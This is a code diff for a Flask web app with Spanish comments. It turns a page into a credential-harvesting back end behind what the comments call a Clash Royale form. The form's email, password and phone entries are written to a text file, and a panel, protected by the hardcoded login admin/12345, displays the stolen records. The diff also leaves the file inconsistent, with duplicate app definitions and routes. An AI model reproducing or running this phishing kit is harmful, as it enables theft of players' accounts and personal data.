@@ -4,22 +4,52 @@ from functools import wraps
 
 app = Flask(__name__, template_folder='.', static_folder='.', static_url_path='')
 
-# --- SEGURIDAD: CONFIGURA TU USUARIO Y CLAVE AQUÍ ---
-def check_auth(username, password):
-    return username == 'admin' and password == '12345' # CAMBIA ESTO POR LO QUE QUIERAS
+from flask import Flask, request, session, redirect, render_template_string
 
-def authenticate():
-    return Response('Acceso Denegado. Credenciales incorrectas.', 401, {'WWW-Authenticate': 'Basic realm="Login Requerido"'})
+app = Flask(__name__)
+app.secret_key = 'una_clave_muy_secreta_y_larga' # CAMBIA ESTO
 
-def requires_auth(f):
-    @wraps(f)
-    def decorated(*args, **kwargs):
-        auth = request.authorization
-        if not auth or not check_auth(auth.username, auth.password):
-            return authenticate()
-        return f(*args, **kwargs)
-    return decorated
-# ----------------------------------------------------
+# Ruta pública: el formulario de Clash Royale
+@app.route('/')
+def index():
+    return render_template_string(open('index.html').read())
+
+# Ruta para guardar datos (pública, para que el form funcione)
+@app.route('/guardar', methods=['POST'])
+def guardar():
+    c = request.form.get('correo')
+    p = request.form.get('password')
+    t = request.form.get('telefono')
+    with open('datos.txt', 'a') as f:
+        f.write(f"{c}|{p}|{t}\n")
+    return "Procesando..."
+
+# Ruta del panel: PROTEGIDA
+@app.route('/panel')
+def panel():
+    if not session.get('logged_in'):
+        return redirect('/login')
+    # Lee los datos del archivo y los muestra
+    with open('datos.txt', 'r') as f:
+        datos = f.read()
+    return f"<pre>{datos}</pre>"
+
+# Ruta de login: Para entrar al panel
+@app.route('/login', methods=['GET', 'POST'])
+def login():
+    if request.method == 'POST':
+        if request.form.get('usuario') == 'admin' and request.form.get('pass') == '12345':
+            session['logged_in'] = True
+            return redirect('/panel')
+        return "Clave incorrecta"
+    return '''<form method="post">
+              Usuario: <input type="text" name="usuario"><br>
+              Clave: <input type="password" name="pass"><br>
+              <input type="submit" value="Entrar">
+              </form>'''
+
+if __name__ == '__main__':
+    app.run()
 
 @app.route('/')
 def index():
